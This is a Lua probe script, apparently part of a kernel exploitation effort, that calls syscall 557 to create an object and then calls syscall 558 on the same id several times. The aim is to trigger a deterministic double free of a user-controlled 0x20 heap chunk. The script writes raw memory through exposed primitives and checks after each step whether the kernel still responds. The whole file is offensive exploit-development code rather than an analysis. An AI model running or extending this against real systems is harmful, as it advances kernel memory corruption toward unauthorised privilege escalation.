-- CRASH_CLASS: HIGH
-- PROBE 790a: destroy the same 557 id twice
--
-- 789a created and destroyed cleanly in every order, but never called 558 on
-- the same id twice. If the second call frees the 0x20 payload again we have a
-- deterministic double free of a user-filled chunk - no race, no timing.
print("=== PROBE 790a: 558 DOUBLE DESTROY ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a)
    a=to_num(a); if a<0 then a=a+18446744073709551616 end
    return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296))
end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "ERR" end
    return to_num(r)
end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function alive() return tostring(call(mk(20),0,0,0,0,0,0)) end
local pl=to_num(memory.alloc(0x100))
local function mknew(tag)
    for i=0,0x100-8,8 do wq(pl+i,0) end
    wq(pl,0x1111111111111111); wq(pl+8,0x2222222222222222)
    local r=call(mk(557),pl,0x1000,0,0,0,0)
    print(string.format("[%s] create=%s alive=%s",tag,tostring(r),alive()))
    return r
end
local id=mknew("A")
for i=1,5 do
    print(string.format("[A] destroy#%d(%s)=%s alive=%s",i,tostring(id),tostring(call(mk(558),id,0,0,0,0,0)),alive()))
end
-- [B] two ids, alternate destroys
local x=mknew("B1"); local y=mknew("B2")
for i=1,3 do
    print(string.format("[B] x#%d=%s y#%d=%s alive=%s",i,tostring(call(mk(558),x,0,0,0,0,0)),i,tostring(call(mk(558),y,0,0,0,0,0)),alive()))
end
-- [C] does the family still create after all that?
local z=mknew("C")
if type(z)=="number" and z>0 then print("[C] destroy="..tostring(call(mk(558),z,0,0,0,0,0))) end
-- [D] churn 20 create/destroy to see health
local ok=0
for i=1,20 do
    for j=0,0x100-8,8 do wq(pl+j,0) end
    local r=call(mk(557),pl,0x1000,0,0,0,0)
    if type(r)=="number" and r>0 and call(mk(558),r,0,0,0,0,0)==0 then ok=ok+1 end
end
print(string.format("[D] churn=%d/20 alive=%s",ok,alive()))
print("=== 790a DONE ===")
